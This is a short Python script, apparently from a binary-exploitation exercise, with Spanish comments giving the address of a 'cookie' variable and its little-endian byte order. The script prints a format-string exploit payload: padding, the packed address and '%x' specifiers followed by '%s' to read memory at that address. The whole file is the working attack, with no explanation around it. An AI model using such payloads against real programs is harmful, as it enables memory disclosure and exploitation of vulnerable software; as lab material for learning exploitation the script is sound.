#payload.py

#Direccion de cokkie:             0804a024
#Direcciond de cookie al revez:   24a00408

output = "A" * 4 + "\x24\xa0\x04\x08" + "%x %x %x %x %s"
print (output)